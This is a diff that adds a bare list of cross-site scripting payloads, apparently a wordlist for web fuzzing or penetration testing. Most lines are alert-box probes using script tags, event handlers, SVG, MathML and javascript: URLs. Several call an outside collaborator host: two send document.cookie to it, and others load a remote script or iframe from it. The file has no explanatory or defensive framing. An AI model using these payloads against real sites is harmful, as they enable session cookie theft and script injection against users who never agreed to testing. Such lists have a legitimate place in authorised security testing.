@@ -1,0 +1,45 @@
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+"><script>alert('XSS')</script>
+'"><img src=x onerror=alert(1)>
+<iframe src=javascript:alert('XSS')>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>test</marquee>
+<svg/onload=prompt`XSS`>
+%3Cscript%3Ealert('XSS')%3C/script%3E
+<body onload=alert('XSS')>
+<video src=x onerror=alert('XSS')>
+<a href=javascript:alert(1)>Click</a>
+<math href="javascript:alert(1)">X</math>
+<svg><script>alert(1)</script></svg>
+<isindex action=javascript:alert(1)>
+<embed src=javascript:alert(1)>
+<base href="javascript:alert(1)//">
+<svg><animate onbegin=alert(1) attributeName=x dur=1s></svg>
+<svg/onload=fetch('//abc.oastify.com')>
+<script>fetch('//abc.oastify.com?c='+document.cookie)</script>
+<svg><script>alert(document.domain)</script></svg>
+<iframe srcdoc="<script>alert(1)</script>">
+<svg><set onbegin=alert(1) attributeName=x></svg>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg/onload=eval('alert(1)')>
+<math><script>alert(1)</script></math>
+<svg><title><![CDATA[</title><script>alert(1)</script>]]></svg>
+"><img src=x onerror=prompt(1)>
+"><svg/onload=confirm(1)>
+"><iframe src=javascript:alert(1)>
+<svg/onload=window.open('javascript:alert(1)')>
+<marquee loop=1 onfinish=alert(1)>test</marquee>
+<object data="javascript:alert(1)">
+<embed code="javascript:alert(1)">
+<svg/onload=location.href='javascript:alert(1)'>
+<a href=JaVaScRiPt:alert(1)>Click</a>
+<svg><script>document.write('XSS')</script></svg>
+<script src=//abc.oastify.com/xss.js></script>
+<iframe src=//abc.oastify.com></iframe>
+<svg/onload=fetch('https://abc.oastify.com?cookie='+document.cookie)>
+<svg/onload=alert(document.location)>
+<svg/onload=alert(navigator.userAgent)>
+<svg/onload=alert(document.referrer)>
+<math><mtext><script>alert(1)</script></mtext></math>
